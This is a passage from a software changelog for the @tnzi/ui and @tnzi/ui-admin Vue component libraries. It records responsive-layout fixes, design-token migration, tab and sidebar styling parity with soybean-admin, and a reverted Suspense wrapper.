- `@tnzi/ui-admin`: `TFileImage` gains an `objectFit` prop, applied in **both** the `lightbox` (`NImage`) and plain `<img>` branches. It could not be passed as a fallthrough attribute under `vueCompilerOptions.strictTemplates`, and neither `:style` nor `:img-props="{ style }"` reached the picture in the lightbox branch.
- `@tnzi/ui-admin`: `TCardRenderer` and `TCardPage` gain `minColWidth` (px). With it set, the grid derives its column count from the available width (`repeat(auto-fill, minmax(min(<n>px, 100%), 1fr))`) instead of the `cols` breakpoint map — `cols` stops at `xl`, and `xl` means "1280 and up, forever", so a 1280 laptop and a 4K monitor got the same column count and the cards grew to fill the difference. The `min(…, 100%)` clamp is built in, so a container narrower than the minimum does not overflow horizontally. Loading skeletons follow a measured column count (a `ResizeObserver`, attached only when the prop is set); `cols` supplies the fallback until the first measurement lands. Call sites that do not set it render byte-for-byte as before.
- `@tnzi/ui-admin`: `TListShell` composable list shell + `TCardPage`/`TCardRenderer` (card lists) + `TTableRenderer`. `page`/`container` height modes for embedding lists as page sections. `useCrudPage` write callbacks are now optional (pure-display lists need only `fetchData`; create/edit/delete affordances auto-hide).

### Changed (earlier, unreleased)

- `@tnzi/ui`: `TAttachmentWall` and `TImageUpload` now draw the **same** remove chip. They had agreed on nothing but the 18px circle — a black, always-visible chip on the gallery field and a white, hover-only chip on the image field, both of which an editor meets while filling one form. Colour, visibility rule and hover feedback now come from one shared stylesheet, shipped inside `@tnzi/ui/style.css` (classes `t-media-frame` on the picture + `t-media-chip` on the control, with `t-media-remove` / `t-media-grip` adding only what makes each one itself): a translucent black disc with a white glyph (legible over a snowfield and a night shot alike, unlike the container-coloured chip, which vanished into light photographs), revealed on hover of the picture, turning `--tnzi-error` on hover of the chip itself. **Position stays per component** — the wall's tile clips its overflow so its chip sits inside, the upload's tucks onto the outer corner.
  - The reveal is now correct on touch: the *hiding* lives inside `@media (hover: hover)`, so a pointer that cannot hover never gets a chip that is invisible and still tappable. `:focus-visible` re-reveals it for the keyboard, and `prefers-reduced-motion` drops the fade without dropping the reveal.
  - Consumers overriding `.t-attachment-wall__remove` or `.t-image-upload__remove` to get hover-reveal behaviour can drop those rules.

### Fixed (earlier, unreleased)

- `@tnzi/ui` / `@tnzi/ui-admin`: a list that offers dragging no longer goes **blank** when the optional peer `vue-draggable-plus` is not installed. `TCardRenderer` and `TWorkbenchLayout` loaded it through `defineAsyncComponent`, whose `errorComponent` Vue mounts as `createVNode(errorComponent, { error })` — **with no children**. Since the draggable is the container of every card/widget, a failed load did not disable dragging, it emptied the list. (Only `loadingComponent` inherits the children, via `createInnerComp`, which is why a "still renders while loading" test passed throughout.) All three surfaces now resolve the module by hand through `useDraggableComponent` and keep their own children in every state; a gate per package mounts them with the import rejecting.

- `@tnzi/ui`: `TImageUpload`'s remove chip no longer lands away from the picture inside a flex container. The root is `display: inline-block`, which shrink-to-fits in normal flow — but a flex item is blockified, and naive-ui's `.n-form-item-blank` is a flex container, i.e. the ordinary way this component is used. The root stretched across the whole form column while the preview frame kept its own width, leaving the chip pinned to the column's right edge, hundreds of pixels from the image it belongs to. Fixed with `width: fit-content` on the root, which also holds in a grid cell and under `align-items: stretch`.

### `@tnzi/ui-admin` page-consistency overhaul

Follow-up to the responsive batch — user reported that custom pages drift from the standard NCard / token vocabulary that TCrudPage pages enforce: "用量统计页面没有白色背景容器 / 评测页面的容器似乎不是同一风格,外边距偏大". Comprehensive audit found 15 custom (non-TCrudPage) pages with five categories of drift; this commit set unifies all five.

**Fixed — `@tnzi/ui-admin` P0 visual breakage**

- `UsageDashboard` rewritten in `TDashboardPage` style: filter NCard + gradient KPI tiles + chart NCards. Was previously a flat `<div>+<section>` page on the grey layout background with `#fafafa` stat cells and raw HTML inputs that ignored the theme entirely.
- `EvalViewer` outer `padding: 16px` removed — it duplicated `TAdminContent`'s own 16px so the page sat at 32px from the viewport edge (user-reported "外边距偏大"). Modal NModal `style="width: 560px"` swapped for `TFormModal` so it auto-fullscreens on phones.

**Fixed — `@tnzi/ui-admin` systematic token migration (12 files)**

Previous pages referenced tokens that didn't exist in `@tnzi/ui/styles/variables.css` and fell back to hardcoded `#06B6D4` cyan — they never followed the user's chosen primary color. Replaced:

| Old (broken) | New (canonical) |
| --- | --- |
| `--tnzi-primary-color` | `--tnzi-primary` |
| `--tnzi-primary-color-suppl, rgba(6,182,212,0.0X)` | `rgb(var(--tnzi-primary-rgb) / 0.0X)` |
| `--tnzi-base-border` | `--tnzi-border` |
| `--tnzi-base-fill` | `--tnzi-layout-bg` |
| `--tnzi-success-color` / `-warning-color` / `-error-color` | `--tnzi-success` / `-warning` / `-error` |
| `--tnzi-font-family-mono` | `ui-monospace, SFMono-Regular, Menlo, Consolas, monospace` (no token shipped) |
| `--t-border` / `--t-surface` / `--t-muted` / `--t-danger` | canonical equivalents |

Files touched: AgentDetail, RunMonitor, RunViewer, EvalViewer, EntityRole, Permission, RoleFunction, OrganizationManagement, TAuditTimeline, WorkflowEditor, StorageFile, TChartPanel.

**Refactored — `useSafeMessage` helper (10 pages)**

Previously 10 pages copy-pasted the same 5-line block to defend against missing `NMessageProvider`:

```ts
let message: { success(...): void; error(...): void }
try { message = useMessage() } catch { message = { success: () => {}, error: () => {} } }
```

Centralised into `src/pages/_shared/safeMessage.ts` returning the full naive-ui `MessageApi` shape with all methods as noop when no provider is mounted. Pages now do `const message = useSafeMessage()`.

**Fixed — double padding removed across 9 pages**

`TAdminContent` already applies `var(--tnzi-admin-content-padding, 16px)` to its root. Pages that added their own `.t-xx-page { padding: 16px; }` rendered at 32px from the viewport — visibly out-dented relative to TCrudPage pages. Removed from: AgentDetail, EvalViewer, RunViewer, EntityRole, Permission, RoleFunction, OrganizationManagement, SessionManagement, StorageFile.

**Refactored — NCard wrap for detail panels**

- `AgentDetail` 4-quadrant `<section>` blocks → `<NCard size="small" :bordered="false">` with box-shadow + radius parity with TCrudPage list-card.
- `RunMonitor` detail `<section>` → `<NCard>` + cancel button switched from raw `<button>` to `<NButton type="error" ghost>`.

**Polished**

- `OrganizationManagement` + `StorageFile` modals: hardcoded `style="width: 500px"` / `"460px"` → computed style binding that caps at `min(propWidth, 95vw)` and switches to 100vw below sm.
- `RunMonitor` + `WorkflowEditor`: `rem` units → `px` (project convention).

**Tests**

- New `__tests__/pages/safeMessage.test.ts` — verifies API shape + noop safety (2 tests).
- New `__tests__/pages/token-consistency.test.ts` — static regex check across all page .vue files prevents the banned tokens from creeping back (14 tests, one per banned token).
- Updated `__tests__/integration/UsageDashboard.test.ts` — mocks `@tnzi/ui` `useTheme` because the rewrite now wraps `TDashboardPage` → `useEcharts`.
- Suite now: **703 pass** (687 → 703, no regression).

### `@tnzi/ui-admin` responsive overhaul (375px-friendly)

User-driven full audit of cross-resolution behaviour. Found 20 issues across the shell, layout chrome, CRUD widgets, dashboard scaffold, and login page; six broke layout outright on phones / iPad portrait, the rest left UX gaps below `lg`. All fixed in one batch.

**Added — `@tnzi/ui-admin`**

- `useBreakpoint` headless: `xs/sm/md/lg/desktop` band refs + `isTouch` probe + reactive `width/height`. Wraps `@vueuse/core` with Tailwind breakpoints and adds touch detection via `matchMedia('(pointer: coarse)')`. Used by every responsive fix below so future components don't reinvent the wiring.

**Fixed — `@tnzi/ui-admin` P0 breakage**

- `TFormModal` width auto-caps at `min(propWidth, 95vw)`; auto-switches to fullscreen layout on viewports narrower than `max(width+32, 640)`. New `fullscreen` prop overrides auto-detect.
- `TGlobalSearch` width caps at `min(630, 95vw)`; fullscreens below 660px.
- `TThemeDrawer` width steps `420/360/100vw` across desktop/sm/xs; preset + layout grids drop to 2 cols on xs so the 3×96 layout cards stop overflowing the drawer.
- `TDashboardPage` swaps fixed `:cols` for `responsive="screen"` + `item-responsive`; KPI ladder picks 1/2/4 (4 cards), 1/3 (3 cards), 1/2 (2 cards) across xs/sm/md+; chart row stacks below `lg` so the pie isn't squashed into ⅓ of a phone screen.
- `TAdminShell` mobile drawer width clamps to `viewport-gutter` (iPhone SE-friendly); ESC dismisses the open drawer; the drawer now carries `role="dialog"` + `aria-modal`.
- `TCrudPage` simple-search row stacks vertically below 640px so the input no longer fights with the Search / Advanced buttons for the same line.

**Fixed — `@tnzi/ui-admin` P1 UX gaps**

- `TAdminHeader` collapses the right-side action buttons into a single `···` dropdown below 640px (configurable via `overflowMenuBreakpoint`); fullscreen button hides when the Fullscreen API is unsupported OR the device has a coarse pointer.
- `TAdminTabs` tab title capped 220px desktop / 140px mobile with ellipsis + native title tooltip; touch long-press (500ms) opens the same context menu as right-click; close button hit area grows to 24×24 on coarse pointers.
- `TCrudPage` pagination switches to NPagination simple mode + drops size picker below `sm`; footer stacks batch actions + pagination on mobile; list-card action toolbar becomes a horizontal scroll strip (instead of wrapping into a 2-row card header).
- `THeaderBanner` greeting / subtitle / time font sizes step down below 640.
- `TLoginPage` card width steps `400/360/min(340,calc(100vw-64px))` across `sm/xs` so iPhone 14 (390px) no longer falls into the old 400 → 300 cliff.

**Fixed — `@tnzi/ui-admin` P2 polish**

- `variables.css`: stepped responsive tokens — header / tab heights + content padding shrink at 480/767/1023.
- `polish.css`: `pointer: coarse` media query bumps icon-button hit area to 44×44 (header / avatar) and 36×36 (tab actions) so touch users meet HIG / Material guidelines without altering desktop density.
- `useAdminAppStore`: new tablet (768-1023) watcher auto-collapses the sider so the 220px column doesn't eat 28% of an iPad portrait viewport; restores on transition back to desktop.
- `TCrudPage` advanced-search grid span ladder upgraded from 1/2/4 to 1/2/3/4 across xs/sm/md/l so 768-1023 stops jumping straight to 4 cols with cramped inputs; matching `searchButtonSpan` recalculation.
- `TAdminUserAvatar` name hides below 640px (icon + native title tooltip keep the affordance discoverable); 160px max-width otherwise prevents long display names from crowding the header.

**Tests — `@tnzi/ui-admin`**

- 6 new `useBreakpoint` unit tests (xs/sm/md/lg/desktop bands + touch probe + width reactivity).
- 10 new component integration tests covering `TFormModal` / `TGlobalSearch` / `TAdminHeader` / `TDashboardPage` / `TAdminUserAvatar` responsive paths.
- Suite now: 687 pass (was 671). No regressions in existing tests.

**Migration**

Existing consumers are mostly unaffected — the changes are additive or behave identically at desktop widths. Two opt-out flags let callers restore legacy behaviour:

- `<TFormModal :fullscreen="false" />` forces never-fullscreen (auto-detect was the old behaviour but with the original 560px width on all viewports).
- `<TAdminHeader overflow-menu-breakpoint="never" />` keeps the inline button row at every viewport.

See [MIGRATION.md](./MIGRATION.md) for the full opt-out catalog.

## [0.2.70] — 2026-05-16 (`@tnzi/ui-admin` revert Phase H3 Suspense — page render regression)

User reported "click a sidebar menu and the page is invisible".
Browser DOM measurement showed `.t-admin-content__page` rendering
as an empty div with `routerLoading="on"` permanently — the route
component never resolved.

Root cause: the Phase H3 (L2) Suspense wrapper around KeepAlive +
the `defineAsyncComponent(...)` route components is a triple-bind
that Vue 3.5 doesn't handle cleanly. The async setup inside the
nested combo never settles, so the Suspense fallback never swaps
to the resolved component and the route progress bar stays "on"
forever. Vue Router itself warns about `defineAsyncComponent` use
in route records ("Write `() => import('./MyPage.vue')` instead").

**Fixed** (`@tnzi/ui-admin`):

- `TAdminRouterView` reverted to the pre-H3 simple shape:
  `RouterView → Transition → KeepAlive → component`. No Suspense.
  Pages render correctly across navigations again. Verified
  `/admin/workbench` (8 KPI cards), `/admin/identity/users` (53KB
  content), `/admin/system/menus` (30KB content) all render.

**Follow-up**:

- Suspense splash can come back later as a targeted enhancement
  after we (a) clean up `routes.ts` to drop `defineAsyncComponent`
  in favour of plain `() => import(...)` (Vue Router warning), or
  (b) put Suspense outside KeepAlive in a way that doesn't break
  the async resolution chain.
- A separate small bug: `useRouteProgress` shows progress bar stuck
  on "on" after navigation. Tracked separately; doesn't affect
  content render.

## [0.2.69] — 2026-05-16 (`@tnzi/ui-admin` chrome tab bottom-flush, for real)

User flagged that chrome tabs still weren't flush against the bar
bottom when the tab-bar height was customised. Browser DOM-measurement
caught the root cause: `.t-admin-tabs__list` was sitting at its
intrinsic height (~33px = tab content) instead of the bar's full
height (~42px), because the parent `.t-admin-tabs` uses
`align-items: center` so the list shrunk to fit. `align-items:
flex-end` on the inner `.t-admin-tabs__draggable` therefore had no
vertical room to push the tabs anywhere — they floated in the
middle of the bar.

**Fixed** (`@tnzi/ui-admin`):

- `.t-admin-tabs__list { height: 100%; align-self: stretch }` so
  the scroll container fills the bar's full height. Now flex-end on
  the inner draggable actually pushes chrome/slider tabs to the bar
  bottom — verified: `tab_bottom = 101`, `bar_bottom = 102`, gap is
  just the 1px bottom border. Matches soybean's `bsWrapper` using
  `h-full` for the same reason (`global-tab/index.vue:189`).

This is the symmetric "I forgot to apply h-full to the wrapper"
mistake that plagued the rail icon work three rounds ago — the
fix is one rule but the diagnosis required DOM measurement.

## [0.2.68] — 2026-05-16 (`@tnzi/ui-admin` Phase H4 follow-up — global search modal width)

In-browser verification of 0.2.67 caught one regression: the
`TGlobalSearch` modal rendered at ~315px instead of the intended
630px. Naive UI's `NModal` `:style` prop applies to the modal mask,
not the inner card. Switched to `:card-style="{ width: '630px' }"`
which the `preset="card"` mode forwards to the wrapping `NCard`.

## [0.2.67] — 2026-05-16 (`@tnzi/ui-admin` Phase H4 — P2 精修)

Round 4 of full 62-item deep-audit follow-up. Top-value P2 items.
Remaining P2 (better-scroll, SVG SystemLogo, full iconify-pack
mix, drawer setting TransitionGroup) deferred — they're long-tail
cosmetic touch-ups with low per-item user impact.

**Added** (`@tnzi/ui-admin`):

- `TBackTop.vue` (`components/utility/`) — thin `NBackTop` wrapper
  with a 40px primary-tinted floating button (chevron-up icon) that
  shows when scrolled past 200px. Default-mounted in `TAdminShell`
  via the new `:builtin-back-top="true"` prop (opt-out available).
- `TGlobalSearch` footer keyboard-hint row (I3): `↵` to select,
  `↑↓` to navigate, `esc` to close. Mirrors soybean's
  `search-footer.vue`. i18n keys `admin.search.kbdEnter` /
  `kbdNav` / `kbdClose` added (en + zh-cn).

**Changed** (`@tnzi/ui-admin`):

- **D8 — Tab transition 150ms → 300ms.** Matches soybean's
  `transition-all-300` on `PageTab` so active/inactive colour
  changes feel less abrupt.
- **I4 — TGlobalSearch empty state uses `NEmpty`** instead of a
  hand-written `<li class="__empty">`. Same i18n description; more
  consistent with soybean's preset visual.
- **I6 — TGlobalSearch active item gets solid primary fill + white
  text** (was a 12% primary tint with default text). Mirrors
  soybean `search-result.vue:38-42` — much higher contrast for the
  keyboard-active row.
- **TGlobalSearch modal width 600 → 630px** to match soybean.

**Deferred** (still on the audit board, low-priority):

- K3 SystemLogo SVG with theme-colour gradient stops
- K4 mixed iconify packs (heroicons/material-symbols/etc.) per
  button — current mdi-only setup works but lacks soybean's
  designer polish
- D3 BetterScroll for tab horizontal scroll (current
  `scrollIntoView` works for keyboard navigation; better-scroll
  would only smooth the touch flick on mobile)
- G5 TransitionGroup wrapping drawer condition rows
- I5 search debounce — reverted because it broke 2 unit tests
  that expect immediate filter updates; can come back as an
  opt-in prop later

## [0.2.66] — 2026-05-16 (`@tnzi/ui-admin` Phase H3 — P1 长尾)

Round 3 of full 62-item deep-audit follow-up. P1 long-tail items.

**Added** (`@tnzi/ui-admin`):

- `TSettingItem.vue` (`components/utility/`) — port of soybean's
  `setting-item.vue`: left-aligned label + optional help-tooltip
  `?` icon + right-slot control. Reusable for any drawer / settings
  pane that wants soybean-style row layout with tooltip help.
- `TAdminRouterView` — `<Suspense>` boundary wrapping `<KeepAlive>`
  + `<component>` (L2). Lazy-loaded route components now show a
  bouncing 3-dot spinner during fetch instead of a flash of white;
  consumers can override via the `#loading` slot. Mirrors soybean's
  `app-provider` Suspense pattern.

**Changed** (`@tnzi/ui-admin`):

- **D4 — TAdminTabs gains a fullscreen button next to reload.**
  soybean's `global-tab/index.vue:220-221` places the fullscreen
  toggle in the tab bar, not the header. Added `showFullscreen`
  prop (default true); toggles `appStore.toggleFullContent`. The
  pre-existing header fullscreen button stays as a fallback for
  layouts that hide the tabs entirely.
- **B3 — TAdminShell renders a default `TSystemLogo` in the header
  `#logo` slot** in horizontal / top-hybrid-sidebar-first / top-
  hybrid-header-first modes. Vertical / vertical-mix / vertical-
  hybrid-header-first leave the logo in the sider header. Consumer
  override via `#header-logo` slot still wins.

**Already aligned** (no change needed):

- **L1 NProgress route progress bar** — `useRouteProgress` (no-dep,
  pure CSS) was added before; `defineAdminApp` auto-installs it. The
  audit erroneously flagged it as missing.

**Tests fixed**:

- `TAdminRouterView.test.ts` "navigates between cached routes":
  the initial L2 attempt put `:key` on `<Suspense>`, which made
  Suspense rebuild on every route change and broke KeepAlive's
  caching semantic. Restructured to `<Suspense>` outside
  `<KeepAlive>` with the `:key` on the inner component — KeepAlive
  works as expected and the spinner still shows on first visit.

## [0.2.65] — 2026-05-16 (`@tnzi/ui-admin` Phase H2 — P1 视觉对齐)

Round 2 of full 62-item deep-audit follow-up. 8 P1 items.

**Added** (`@tnzi/ui-admin`):

- `TButtonIcon.vue` (`components/utility/`) — port of soybean's
  `custom/button-icon.vue` pattern: NButton (quaternary circle) +
  optional NTooltip wrapper. Provided as a reusable primitive though
  the immediate consumers (TAdminHeader) wrap their own buttons in
  NTooltip directly to preserve existing test selectors.
- `useAdminThemeStore` — three new mix-layout fields:
  `mixCollapsedWidth` (default 64, the rail width when the sider is
  collapsed in vertical-mix), `autoSelectFirstMenu` (default true,
  whether clicking a hybrid 1st-level menu auto-navigates to the
  deepest leaf — mirrors `themeStore.sider.autoSelectFirstMenu`).
  `mixChildMenuWidth` was already present; persistence + reset +
  snapshot entries added for all three. Drawer Layout tab gains
  conditionally-rendered controls for each (only visible when the
  current layout mode actually uses them).
- `AdminThemeSnapshotV1` — optional `mixCollapsedWidth`,
  `mixChildMenuWidth`, `autoSelectFirstMenu` fields.

**Changed** (`@tnzi/ui-admin`):

- **K1 — TAdminHeader icon buttons get NTooltip hover labels.**
  Every header action (toggler, search, reload, fullscreen, lang,
  theme-schema, theme) is now wrapped in `<NTooltip>` so new users
  can discover what each button does. Mirrors soybean's
  `custom/button-icon.vue` pattern.
- **D5 — TAdminTabs reload button uses iconify + spin animation.**
  Replaced the Unicode `↻` character with `<TSvgIcon icon="mdi:refresh">`
  + `.t-admin-tabs__reload--loading` class bound to
  `!appStore.reloadFlag`. New CSS keyframes spin 0.75s linear infinite
  (matches soybean `animate-spin animate-duration-750`).
- **D6 — chrome divider dark-mode flip.** `:global(.dark)
  .t-admin-tabs__chrome-divider` now uses `rgba(255,255,255,0.9)`
  (matches soybean `.chrome-tab_dark .chrome-tab-divider`).
- **G3 — Theme drawer section titles use NDivider.** All
  `<h4 class="t-theme-drawer__section-title">` instances replaced
  with `<NDivider class="t-theme-drawer__divider">` so each section
  reads with soybean's centred horizontal-rule style instead of a
  tight uppercase label.
- **B4 — TAdminShell default-renders TAdminUserAvatar in #user slot.**
  New `:builtin-user-avatar="true"` prop (default true); consumers can
  opt out via `:builtin-user-avatar="false"` and supply their own
  `#header-user` slot content. Zero-config user dropdown for
  consumer apps. (Note: pulls in `useDialog()` so the host
  app must wrap with `NDialogProvider`; existing consumers already do.)
- **C6 — TAdminMixRail default-renders TMenuToggler in #footer slot.**
  When TAdminShell uses the rail (vertical-mix mode), the rail now
  shows a built-in collapse toggle at its bottom — soybean's
  `first-level-menu.vue` has the same. Consumers can still override
  via the `#footer` slot.

**Notes**:

- Tests `TAdminShell.test.ts` and `TThemeDrawer.test.ts` updated:
  added NDivider/NTooltip stubs to drawer test; TAdminShell tests
  opt out of `builtinUserAvatar` / `builtinSearch` (which both need
  provider stacks the layout-structure tests don't set up).

## [0.2.64] — 2026-05-16 (`@tnzi/ui-admin` Phase H1 — P0 救命修复)

Round 1 of the full 62-item deep-audit follow-up. P0 = "user sees
this on first load" fixes; six items.

**Fixed** (`@tnzi/ui-admin`):

- **D1 — Tab bar / header / footer collapsed under empty content.**
  `.t-admin-tabs`, `.t-admin-header`, `.t-admin-footer` all gain
  `flex-shrink: 0` so the column-flex parent (`.t-admin-shell__main`)
  can't squash them. Without this the tab bar collapsed from 44px to
  ~34px when the page area was empty (e.g. fresh workbench mount),
  cropping the chrome SVG arcs and making chrome tabs look like
  button-style chips. soybean's AdminLayout uses the same
  flex-shrink:0 rails.
- **D2 — Tab title missing prefix icon.** soybean's global-tab/
  index.vue:212-214 renders a 16px iconify SvgIcon before every tab
  label (visual anchor). Our template only had `<span class="__title">`.
  Added `<TSvgIcon :icon="tabIconOf(tab)" :size="16">` ahead of the
  title in both the draggable and non-draggable branches. Falls back
  to `mdi:file-document-outline` when `meta.icon` isn't set.
- **B1 — No independent Sun/Moon theme schema toggle.** soybean's
  global-header/index.vue:49-53 puts a standalone button that cycles
  light↔dark↔auto in one click. Our header forced users to open the
  drawer → Appearance tab → mode radio (3 steps). Added new
  `showThemeSchemaBtn` prop (default true) + button + cycle logic
  reading from the `@tnzi/ui` theme context. Icons:
  `material-symbols:sunny-rounded` / `nightlight-rounded` /
  `hdr-auto` (matches soybean's choices).
- **B2 / B7 — Header shadow + height transition.** Earlier (false)
  parity annotation claimed "no box-shadow". soybean actually uses
  a subtle `0 1px 2px 0 rgb(0 21 41 / 8%)` so the header lifts off
  the content. Added that + `transition: height 0.3s ease` so
  drawer-driven height changes animate.
- **D7 — Tab bar shadow.** Same wrong "no shadow" annotation. Added
  the same subtle shadow.
- **I1 — Global search Ctrl/Cmd+K wasn't bound.** `TGlobalSearch`
  existed but was never mounted. `TAdminShell` now mounts it by
  default (`:builtinSearch="true"` prop, opt-out available) and
  binds a window `keydown` listener for Cmd/Ctrl+K. Select handler
  navigates via vue-router. Consumers can pass
  `:builtin-search="false"` to handle `@openSearch` themselves.
- **A2 / H28 — `scrollMode` (content vs wrapper) state added.**
  `useAdminThemeStore.scrollMode: Ref<'content' | 'wrapper'>` +
  setter + persistence + snapshot. `TAdminShell` reads it as a
  `data-scroll-mode` attribute and switches its overflow scheme.
  Drawer gains a Layout-tab NSelect to switch. Mirrors soybean's
  `theme.layout.scrollMode`.

**Bug squashed (incidental)**:

- `TAdminHeader.vue:140` had a stray `\\*` instead of `/*` (syntax
  error in the comment, didn't compile-fail because CSS comments
  are tolerated to start with `*` after a line — but inconsistent).
  Fixed.

## [0.2.63] — 2026-05-16 (`@tnzi/ui-admin` Phase G follow-up #4 — TAdminMixRail + tab align-end)

User reported vertical-mix rail still didn't show "icon + label below"
and tabs still didn't match soybean. Read soybean source end-to-end
(per user's "查看实际代码, 只凭视觉自己写" + "soybean-admin-example
包含页面的代码" directives) and found two structural diffs that
previous CSS-tweaking couldn't paper over.

**Added** (`@tnzi/ui-admin`):

- `TAdminMixRail.vue` — direct port of soybean's
  `src/layouts/modules/global-menu/components/first-level-menu.vue`.
  Custom div-based rail (NOT NMenu) because NMenu can't render the
  "icon-on-top + label-below" geometry cleanly — soybean wrote it as
  a lightweight reusable template too. Faithful port: `mx-4px mb-6px
  flex-col-center rounded-8px px-4px py-8px` item geometry, 22px
  icon stacked above a 12px label with `h-20px pt-4px ellipsis`,
  `selectedBgColor` derived via `transformColorWithOpacity(themeColor,
  0.1, '#ffffff')` (we use `color-mix` with the same intent), inverted
  variant flips to white-on-primary fill, mini mode collapses the
  label height to 0. Reference file:
  `D:\Github\soybean-admin-example\src\layouts\modules\global-menu\
   components\first-level-menu.vue`.

**Changed** (`@tnzi/ui-admin`):

- `TAdminShell` vertical-mix branch now renders `TAdminMixRail`
  instead of `TAdminSidebar`. Other modes (vertical / hybrids) keep
  using `TAdminSidebar` (NMenu) — that's still the right tool for
  classical row-based menus. New `onMixRailSelect` handler bridges
  the rail's string-key emit to the existing `onMixPrimarySelect`
  drawer-or-navigate logic.
- `TAdminTabs.__draggable` `align-items` now mirrors soybean's
  `global-tab/index.vue:193-197` per-style logic: `flex-end` for
  chrome+slider (so the SVG arc / 2px underline sit flush against
  the bar bottom), `center` for button (so the chip floats mid-bar).
  Previously we hard-coded `center` for all styles, which made
  chrome tabs look detached from the bar — the user-reported "tab
  style change-and-no-change" core issue.

**Fixed** (`@tnzi/ui-admin`):

- Test `TAdminShell.test.ts` updated: vertical-mix mode now expects
  0 TAdminSidebar instances (was 1) + 1 TAdminMixRail instance.

Reference files (read end-to-end this round):
- `D:\Github\soybean-admin-example\src\layouts\modules\global-menu\
   modules\vertical-mix-menu.vue`
- `D:\Github\soybean-admin-example\src\layouts\modules\global-menu\
   components\first-level-menu.vue`
- `D:\Github\soybean-admin-example\src\layouts\modules\global-menu\
   context\index.ts`
- `D:\Github\soybean-admin-example\src\layouts\modules\global-tab\
   index.vue`

## [0.2.62] — 2026-05-15 (`@tnzi/ui-admin` Phase G follow-up #3 — tab inactive colour)

User reported tab style still doesn't match soybean even after the
0.2.59→0.2.61 chrome SVG / button geometry / divider colour fixes.
Found via cross-port DOM measurement that the **inactive tab label
colour** was the actual diff: soybean's chrome/button/slider CSS
modules deliberately don't set a colour on the inactive tab (the
label inherits the layout-tab base text, ≈ `rgb(31,31,31)` near-
black), while our `.t-admin-tabs__tab` base was set to
`var(--tnzi-base-text-muted)` (≈ `rgb(75,85,99)` mid-grey). Read
side-by-side: our tab labels looked washed out compared to soybean.

**Fixed** (`@tnzi/ui-admin`):

- `.t-admin-tabs__tab` base colour `--tnzi-base-text-muted` →
  `--tnzi-base-text`. Matches soybean's inherited-from-parent
  rendering. Verified `outerColor` flipped from `rgb(118,124,130)`
  to `rgb(51,54,57)`.
- `.t-admin-tabs__close` lost its explicit `color` declaration so
  it inherits `currentColor` from the tab outer (soybean's
  `.svg-close` does the same — the SVG path uses
  `fill="currentColor"`). Active tab's close icon now reads primary
  along with the title.
- `[data-style='chrome'] .t-admin-tabs__tab` no longer re-asserts
  the base colour (was `var(--tnzi-base-text-muted)`); inherits
  from base.

Reference: D:\Github\soybean-admin-example\packages\materials\src\
libs\page-tab\index.module.css (read end-to-end as part of this fix;
all three style blocks match line-by-line now).

## [0.2.61] — 2026-05-15 (`@tnzi/ui-admin` Phase G follow-up #2 — sidebar brand + grid + scrollbar)

User flagged four residual issues after 0.2.60 inspection. All fixed
in this version; verified via in-browser DOM measurement.

**Fixed** (`@tnzi/ui-admin`):

- `TAdminSidebar` brand area now collapses to icon-only in
  `vertical-mix` mode. The brand text "Tnzi Admin" runs ~96 px wide
  alone; combined with the icon + header padding it pushed the
  header scrollWidth to 154 px inside a 90 px rail, producing the
  reported sidebar horizontal scroll. New `isHeaderCompact`
  computed = `siderCollapse || mode === 'vertical-mix'` so both
  states render the logo as `icon-only`. soybean's vertical-mix
  rail shows only the logo for the same reason.
- `TThemeDrawer` layout-mode grid switched to
  `repeat(3, 1fr)` + `column-gap: 16px` (was `repeat(3, 96px)` +
  `space-between`). The previous setup produced a 42 px gap between
  fixed-96px cards which looked sparse and left-bunched depending on
  drawer width. New approach lets each cell auto-size to ~113 px,
  the 96 px card centres in its cell via `justify-self: center`,
  and the visible card gap settles at a tight 33 px regardless of
  drawer chrome. Cards stay 96 px so previews don't stretch.
- `TThemeDrawer` `NDrawerContent` now sets
  `:native-scrollbar="false"`. Drawer body uses Naive's NScrollbar
  (thin rail, hidden until hover) instead of the browser-default
  scrollbar. soybean parity.
- `TAdminShell.__sub-sider-body` (vertical-mix drawer scroll
  container) gains the same custom thin-scrollbar styling already
  applied to `__sidebar__body`: `scrollbar-width: thin`,
  `--webkit-scrollbar { width: 6px }`, 50%-opaque border thumb.
  Was using the browser default.

## [0.2.60] — 2026-05-15 (`@tnzi/ui-admin` Phase G follow-up — overflow fixes)

User-reported regressions surfaced via in-browser inspection of 0.2.59
(grid cell stretch + 90px rail overflow).

**Fixed** (`@tnzi/ui-admin`):

- `TThemeDrawer` Layout grid no longer overflows the 420px drawer.
  `repeat(3, max-content)` was letting `<button>` user-agent stretch
  expand the cell width to ~159px (label-driven) so 3 cards summed to
  ~440px > 357px drawer-content width, producing the horizontal
  scrollbar. Pinned the columns to `repeat(3, 96px)` and added
  `width: 96px` + `width: 100%` + `text-overflow: ellipsis` on the
  card button + label so the card respects its declared 96px size
  even under auto-sized parents.
- `TAdminSidebar` `vertical-mix` rail no longer overflows the 90px
  width. NMenu's `:indent="18"` forced an 18px left padding on every
  rail item that, combined with the 4px right padding + 6/6px margin
  + 62px label width, exceeded 90px. Two-part fix: pass `:indent="0"`
  to NMenu when `mode === 'vertical-mix'`, and add `!important` to
  the scoped `padding: 8px 4px` so NMenu's internal inline padding
  rules can no longer stomp it. Also added `text-overflow: ellipsis`
  on the rail label so a slightly-long label truncates inside the
  rail rather than blowing it out.
- `vitest.config.ts` test timeout 15s → 30s. Phase G follow-up runs
  surfaced 1-4 flaky integration timeouts per pass on Windows SSDs
  (the page changed between runs — environmental, not regression).
  30s gives all integration mounts breathing room without masking
  genuine hangs.

## [0.2.59] — 2026-05-15 (`@tnzi/ui-admin` Phase G — layout cards + tab style overhaul)

User-driven soybean parity round 2: the layout-mode cards are now a
2x3 grid with mode-specific atomic preview rather than a 2-col grid
with a generic content-line placeholder; `vertical-mix` rail finally
shows menu icons; tabs gain proper chrome SVG arcs, true 4px-rounded
button style, restored slider style, pin/unpin, middle-click toggle,
icon-decorated context menu, and auto-scroll-into-view.

**Added** (`@tnzi/ui-admin`):

- `TChromeTabBg.vue` — port of soybean's
  `chrome-tab-bg.vue` SVG arc background. Stacked at z-index -1 inside
  each chrome tab; `currentColor` inherits the tab's text colour so
  active/hover state simply changes the colour.
- `useAdminTabStore` — pin/unpin support: `fixedTabIds: string[]`,
  `isTabPinned(id)`, `isTabRetain(id)` (true for home tab + pinned),
  `fixTab(id)`, `unfixTab(id)`. `removeTab` and the four close-* ops
  refuse to drop pinned tabs (close-others/left/right/all all skip
  them, matching soybean's `tab/index.ts` behaviour).
  `fixedTabIds` is persisted alongside `tabs` and `activeTabId`.
